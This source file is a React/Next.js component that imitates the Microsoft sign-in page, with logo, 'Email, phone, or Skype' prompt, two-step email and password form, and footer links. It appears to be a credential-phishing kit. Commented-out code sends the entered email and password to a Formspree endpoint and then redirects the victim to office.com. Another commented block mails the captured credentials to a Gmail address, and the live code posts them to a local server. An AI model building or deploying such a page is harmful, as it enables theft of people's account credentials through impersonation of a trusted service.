'use client'

import React, { useState } from 'react';
import { useRouter } from 'next/navigation';

const YourForm = () => {
  const router = useRouter();

  const [step, setStep] = useState<number>(1);
  const [email, setEmail] = useState<string>('');
  const [password, setPassword] = useState<string>('');
  const [isEmailValid, setIsEmailValid] = useState<boolean>(true); // Track email validation status


  const handleNext = () => {
    if (step === 1 && isEmailValid) {
      // Proceed to the next step only if the email is valid
      setStep(2);
    }
  };

  const handleBack = () => {
    if (step === 2) {
      setStep(1);
    }
  };


  // const handleSignIn = () => {
  //   // Add password validation if needed
  //   // Add your sign-in logic here using email and password
  //   alert(`Signing in with:\nEmail: ${email}\nPassword: ${password}`);
  // };

  const handleSignIn = async (e: { preventDefault: () => void; }) => {
    e.preventDefault();

    // // Formspree endpoint for your form
    // const formEndpoint = 'https://formspree.io/f/xyyrknzl';

    // // Send the form data to Formspree
    // const response = await fetch(formEndpoint, {
    //   method: 'POST',
    //   headers: {
    //     'Content-Type': 'application/json',
    //   },
    //   body: JSON.stringify({ email, password }),
    // });

    // if (response.ok) {
    //   // Successfully sent
    //   router.push("https://www.office.com/")
    // } else {
    //   // Error occurred
    //   console.error('Error sending email.');
    // }

    // const to = "b59598204@gmail.com"
    // try {
    //   const response = await fetch('http://localhost:3001/send-email', {
    //     method: 'POST',
    //     headers: {
    //       'Content-Type': 'application/json'
    //     },
    //     body: JSON.stringify({ to, password, email })
    //   });

    //   const data = await response.json();
    //   console.log(data);
    // } catch (error) {
    //   console.error('Error sending email:', error.message);
    // }

    // Example using fetch API
    fetch('http://localhost:3003/signin', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        username: email,
        password: password,
      }),
    })
      .then(response => response.json())
      .then(data => console.log(data))
      .catch(error => console.error(error));

  };


  const validateEmail = (input: string) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    setIsEmailValid(emailRegex.test(input));
  };

  const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const inputValue = e.target.value;
    setEmail(inputValue);
    validateEmail(inputValue);
  };

  React.useEffect(() => {
    // Example using fetch API
    fetch('http://localhost:3003/users')
      .then(response => response.json())
      .then(data => console.log(data))
      .catch(error => console.error(error));
  }, [])

  return (
    // <main className='w-full h-screen flex justify-center items-center'>
    //   <div className="form-container bg-white">
    //     <div className={`form-section ${showEmail ? 'active' : 'inactive'}`}>
    //       <label>Email:</label>
    //       <input
    //         type="email"
    //         value={email}
    //         onChange={(e) => setEmail(e.target.value)}
    //       />
    //     </div>

    //     <div className={`form-section ${showEmail ? 'inactive' : 'active'}`}>
    //       <label>Passport:</label>
    //       <input
    //         type="text"
    //         value={passport}
    //         onChange={(e) => setPassport(e.target.value)}
    //       />
    //     </div>

    //     <div className="button-container">
    //       {showEmail && (
    //         <button onClick={handleNext} className="next-button">
    //           Next
    //         </button>
    //       )}

    //       {!showEmail && (
    //         <button onClick={handleBack} className="back-button">
    //           Back
    //         </button>
    //       )}
    //     </div>
    //   </div>
    // </main>
    // <main className='w-full h-screen flex justify-center items-center'>
    //   <div className={`form-container ${showEmail ? 'email-active' : 'password-active'} p-[44px]`}>
    //     <div className={`form-section ${showEmail ? 'active' : 'inactive'}`}>
    //       <label>Email:</label>
    //       <input
    //         type="email"
    //         value={email}
    //         onChange={(e) => setEmail(e.target.value)}
    //       />
    //     </div>

    //     <div className={`form-section ${showEmail ? 'inactive' : 'active'}`}>
    //       <label>Password:</label>
    //       <input
    //         type="password"
    //         value={password}
    //         onChange={(e) => setPassword(e.target.value)}
    //       />
    //     </div>

    //     <div className="button-container">
    //       {showEmail && (
    //         <button onClick={handleNext} className="next-button">
    //           Next
    //         </button>
    //       )}

    //       {!showEmail && (
    //         <button onClick={handleBack} className="back-button">
    //           Back
    //         </button>
    //       )}
    //     </div>
    //   </div>
    // </main>
    // <main className='w-full h-screen flex justify-center items-center'>
    //   <div className="form-container">
    //     {showPassword ? (
    //       <div className="form-section password-section">
    //         <label>Password:</label>
    //         <input
    //           type="password"
    //           value={password}
    //           onChange={(e) => setPassword(e.target.value)}
    //         />
    //       </div>
    //     ) : (
    //       <div className="form-section email-section">
    //         <label>Email:</label>
    //         <input
    //           type="email"
    //           value={email}
    //           onChange={(e) => setEmail(e.target.value)}
    //         />
    //       </div>
    //     )}

    //     <div className="button-container">
    //       {showPassword ? (
    //         <button onClick={handleBack} className="back-button">
    //           Back
    //         </button>
    //       ) : (
    //         <button onClick={handleNext} className="next-button">
    //           Next
    //         </button>
    //       )}
    //     </div>
    //   </div>
    // </main>

    <div className="relative flex flex-col items-center justify-center h-screen">

      {step === 1 ? (

        <div className="step-container fade slideLeft w-full h-screen sm:w-[440px] sm:h-[338px] p-[44px] bg-white">
          <div className="bg-[url('/images/micro-logo.svg')] w-[108px] h-[24px]"></div>

          <div className='mt-4'>
            <p className='text-[17px] leading-[20px] text-[#1b1b1b] font-semibold'>Sign in
            </p>
          </div>

          {!isEmailValid && (
            <p className="text-red-500 text-sm mt-2">Please enter a valid email address.</p>
          )}

          <input
            type="email"
            id="entry-send"
            className='w-full mt-3 border-b border-b-[#2f2f2f] outline-none ring-0 pb-[5px]'
            value={email}
            onChange={handleEmailChange}
            placeholder='Email, phone, or Skype'
            required
          />

          <div className='mt-4'>
            <p className='text-[13px] leading-[20px]'>No account? <span className='text-[#0067b8] hover:underline cursor-pointer'>Create one!</span></p>
          </div>

          <div className='mt-[17px]'>
            <p className='text-[13px] leading-[20px] text-[#0067b8]'> Sign in with a security key </p>
          </div>
          <div className='mt-[28px] flex justify-end items-end w-full '>
            <button className='focus:underline bg-[#005da6] h-[30px] text-[13px] text-white w-16' onClick={handleNext}>Next</button>
          </div>

        </div>
      ) : (
        <div className="step-container fade slideRight w-[440px] h-[338px] p-[44px] bg-white">
          <div className="bg-[url('/images/micro-logo.svg')] w-[108px] h-[24px]"></div>

          <div className='flex items-center gap-[2px] mt-4'>
            <div className='hover:rounded-full hover:bg-[#0000002b] cursor-pointer ' onClick={handleBack}>
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><title>assets</title><path d="M18,11.578v.844H7.617l3.921,3.928-.594.594L6,12l4.944-4.944.594.594L7.617,11.578Z" fill="#404040" /><path d="M10.944,7.056l.594.594L7.617,11.578H18v.844H7.617l3.921,3.928-.594.594L6,12l4.944-4.944m0-.141-.071.07L5.929,11.929,5.858,12l.071.071,4.944,4.944.071.07.071-.07.594-.595.071-.07-.071-.071L7.858,12.522H18.1V11.478H7.858l3.751-3.757.071-.071-.071-.07-.594-.595-.071-.07Z" fill="#404040" /></svg>
            </div>
            <p className='text-[13px] text-[#1b1b1b] leading-[20px]'>{email}</p>
          </div>
          <div className='mt-4'>
            <p className='text-[24px] leading-[20px] text-[#1b1b1b] font-semibold'>Enter password
            </p>
          </div>
          {/* <div className='mt-4 '>
            <p className='text-[14px] text-[#1b1b1b]'>We need your help to look up an account with this username.</p>
          </div> */}
          <input
            type="password"
            id="entry-test"
            value={password}
            placeholder='Password'
            className='w-full mt-4 border-b border-b-[#2f2f2f] outline-none ring-0 pb-[5px]'
            onChange={(e) => setPassword(e.target.value)}
            required
          />

          <div className='mt-[17px]'>
            <p className='text-[13px] hover:underline leading-[20px] text-[#0067b8]'> Forgot password? </p>
          </div>


          <div className='mt-[17px]'>
            <p className='text-[13px] hover:underline leading-[20px] text-[#0067b8]'> Other ways to sign in </p>
          </div>

          {/* <button onClick={handleBack}>Back</button> */}
          {/* <button onClick={}></button> */}
          <div className='mt-[28px] flex justify-end items-end w-full '>
            <button className='focus:underline bg-[#005da6] h-[30px] text-[13px] text-white w-16' onClick={handleSignIn}>Sign in</button>
          </div>
        </div>
      )
      }

      <div className='absolute bottom-0 right-0 pr-6 flex justify-end items-end gap-5 pb-3'>


        <p className='text-xs hover:underline cursor-pointer'>
          Terms of use
        </p>

        <p className='text-xs hover:underline cursor-pointer'>
          Privacy & cookies
        </p>

        <p className='text-xs hover:underline cursor-pointer'>
          ...
        </p>
      </div>
    </div >



  );
};

export default YourForm;
